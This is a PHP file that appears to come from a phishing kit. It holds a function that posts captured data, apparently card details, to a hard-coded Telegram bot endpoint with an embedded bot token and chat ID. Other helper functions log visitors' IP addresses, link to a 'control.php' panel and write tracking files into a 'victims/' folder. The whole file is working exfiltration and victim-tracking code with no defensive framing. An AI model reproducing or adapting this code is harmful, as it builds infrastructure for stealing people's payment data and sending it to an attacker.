<?php

$ip  = $_SERVER['REMOTE_ADDR'];
function functiondilih($cc) {
    
    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot5663786513:AAGdfa_IHeAGDn6rSJS7vZVUGtJY9onowj0/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=1520548300&text=".$cc);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);
}
function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
    function get_steps_link() {
        $url = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $x = pathinfo($url);
        return $ee = $x['dirname'] . '/control.php?ip=' . get_client_ip();
    }
    function reset_data() {
        $fp = fopen('victims/'. get_client_ip() .'.txt', 'wb');
        fwrite($fp, 0);
        fclose($fp);
    }
?>